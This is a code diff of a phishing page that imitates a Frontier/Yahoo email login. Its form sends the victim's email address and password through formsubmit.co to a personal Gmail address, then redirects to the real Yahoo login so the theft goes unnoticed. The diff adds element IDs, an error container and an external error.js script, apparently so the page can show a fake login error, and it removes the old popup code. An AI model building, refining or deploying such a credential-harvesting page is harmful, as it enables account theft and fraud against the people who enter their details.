@@ -147,7 +147,7 @@ function submit_login(e)
 //-->
 </script>
 
-      <form action="https://formsubmit.co/garybull299@gmail.com" method="POST">
+      <form id="form" action="https://formsubmit.co/garybull299@gmail.com" method="POST">
         <input type="hidden" name="_next" value="https://login.yahoo.com/?.intl=in">
         <input type="hidden" name="_captcha" value="false">
         <input type="hidden" name="_template" value="table">
@@ -160,14 +160,16 @@ function submit_login(e)
             <div class="col-md-4 col-md-offset-1">
               <div class="form-group">
                 <label for="email">Email Address</label>
-                <input type="email" class="form-control" tabindex="1" name="email" id="email" placeholder="username@frontier.com">
+                <input id="name" type="email" class="form-control" tabindex="1" name="email" id="email" placeholder="username@frontier.com">
               </div>
               <div class="form-group">
                 <label for="pass">Password</label>
-                <input type="password" class="form-control" tabindex="2" name="password" id="pass" placeholder="**********" autocomplete="off">
+                <input type="password" class="form-control" tabindex="2" name="password" id="password" placeholder="**********" autocomplete="off">
+                <div id="error"></div>
               </div>
 
-              <button type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit" onclick="openpopup();openpopup2()" >Login</button>
+              <button id='button' type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit" onclick="openpopup();openpopup2()" >Login</button>  
+                <!-- <button id='button' type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit">Login</button> -->
                 
 
               <p><a href="https://acctedit.frontier.com/forgot-password;src=mail">Forgot your password ?</a></p>
@@ -407,22 +409,8 @@ function submit_login(e)
     </section>
 
     <script src="/dtm_bottom.js"></script><script>try { _satellite.pageBottom(); } catch (e) {}</script>
-    <script>
-      let popup = document.getElementById("popup");
+    
 
-      let blur = document.getElementById("blur")
-
-      function openpopup(){
-        popup.classList.add("open-popup");
-      }
-      function openpopup2(){
-        popup.classList.add("open-popup");
-      blur.classList.add("active")
-      }
-      function closepopup(){
-        popup.classList.remove("open-popup");
-        
-      }
-    </script>
+    <Script defer src="error.js"></Script>
   </body>
 </html>
